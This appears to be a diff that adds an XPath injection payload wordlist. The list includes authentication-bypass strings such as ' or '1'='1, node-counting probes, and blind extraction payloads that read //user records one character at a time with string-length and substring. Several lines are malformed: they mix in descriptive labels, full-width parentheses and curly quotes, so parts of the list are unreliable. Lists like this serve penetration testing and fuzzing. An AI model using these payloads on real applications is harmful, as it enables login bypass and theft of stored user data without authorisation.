@@ -1,0 +1,31 @@
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+' and string.stringlength(//user[position()=1]/child::node()[position()=2])
+' and count(expression): count(//user/child::node()）
+' and stringlength(string): string-length(//user[position()=1]/child::node()[position()=2])=6
+' and substring(string, number, number): substring((//user[position()=1]/child::node()[position()=2]),1,1)=”a”
+and count(/*)=1 and '1'='1
+and count(/@*)=1 and '1'='1
+and count(/comment())=1 and '1'='1
+and string.stringlength(//user[position()=1]/child::node()[position()=2])
+and count(expression): count(//user/child::node()）
+and stringlength(string): string-length(//user[position()=1]/child::node()[position()=2])=6
+and substring(string, number, number): substring((//user[position()=1]/child::node()[position()=2]),1,1)=”a”
+count(/*)=1 and '1'='1
+count(/@*)=1 and '1'='1
+count(/comment())=1 and '1'='1
+string.stringlength(//user[position()=1]/child::node()[position()=2])
+count(expression): count(//user/child::node()）
+stringlength(string): string-length(//user[position()=1]/child::node()[position()=2])=6
+substring(string, number, number): substring((//user[position()=1]/child::node()[position()=2]),1,1)=”a”
